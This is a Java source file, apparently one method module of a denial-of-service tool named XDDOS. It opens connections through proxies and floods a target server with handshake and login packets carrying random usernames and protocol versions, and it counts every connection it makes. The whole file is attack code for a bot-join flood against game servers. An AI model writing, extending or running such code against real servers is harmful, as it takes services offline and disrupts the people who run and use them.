import java.security.SecureRandom;
import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class XDJOIN implements IMethod {
    private final Handshake handshake;
    private final byte[] bytes;

    public XDJOIN() {
        this.handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, getRandomProtocolVersion());
        this.bytes = this.handshake.getWrappedPacket();
    }

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
        channel.writeAndFlush(Unpooled.buffer().writeBytes(generateRandomLoginRequest().getWrappedPacket()));
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
    }

    private int getRandomProtocolVersion() {
        // Generate a random protocol version within a certain range
        return new SecureRandom().nextInt((MAX_VERSION - MIN_VERSION) + 1) + MIN_VERSION;
    }

    private LoginRequest generateRandomLoginRequest() {
        // Generate a highly unpredictable sequence of characters for login request ID
        String loginRequestID = generateRandomString();
        return new LoginRequest(loginRequestID + "_MS");
    }

    private String generateRandomString() {
        // Generate a random string of alphanumeric characters
        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        SecureRandom random = new SecureRandom();
        for (int i = 0; i < RANDOM_STRING_LENGTH; i++) {
            sb.append(characters.charAt(random.nextInt(characters.length())));
        }
        return sb.toString();
    }

    // Constants
    private static final int MIN_VERSION = 1;
    private static final int MAX_VERSION = 5;
    private static final int RANDOM_STRING_LENGTH = 10;
}
